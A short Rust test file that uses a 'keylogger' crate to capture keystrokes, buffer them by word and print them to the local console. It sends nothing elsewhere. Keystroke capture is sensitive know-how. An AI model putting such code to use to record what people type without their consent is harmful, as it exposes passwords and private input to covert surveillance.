use std::{char::REPLACEMENT_CHARACTER, io::Write};

use keylogger::KeyLogger;

#[test]
fn main() {
    let kl = KeyLogger::init().unwrap();
    let mut buffer: Vec<char> = Vec::new();
    let test = kl.start_logging(move |c| {
        let code = c as u32;
        if code == 32 || code == 13 {
            for c in buffer.drain(0..) {
                print!("{}", c);
            }
            if code == 32 {
                print!(" ");
                let _ = std::io::stdout().flush();
            } else {
                println!();
                let _ = std::io::stdout().flush();
            }
        } else if c != REPLACEMENT_CHARACTER {
            buffer.push(c)
        }
    });
    if let Err(e) = test {
        println!("{}", e);
    }
}
